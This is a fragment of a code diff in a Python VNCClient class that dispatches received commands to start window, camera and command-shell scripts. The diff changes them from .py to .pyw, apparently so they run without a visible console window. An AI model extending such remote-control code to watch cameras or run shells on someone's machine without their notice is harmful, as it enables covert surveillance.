@@ -15,14 +15,14 @@ class VNCClient:
             if self.a == 'win':
                 print("WIN")
                 print(f"command = {self.a}")
-                subprocess.call('start win.py', shell=True)
+                subprocess.call('start win.pyw', shell=True)
             elif self.a == 'cam':
                 print("CAM")
                 print(f"command = {self.a}")
-                subprocess.call('start cam.py', shell=True)
+                subprocess.call('start cam.pyw', shell=True)
             elif self.a == 'cmd':
                 print("CMD")
-                subprocess.call('start cmdc.py', shell=True)
+                subprocess.call('start cmdc.pyw', shell=True)
                 print(f"command = {self.a}")
             elif self.a == 'cpfl':
                 # os.system(
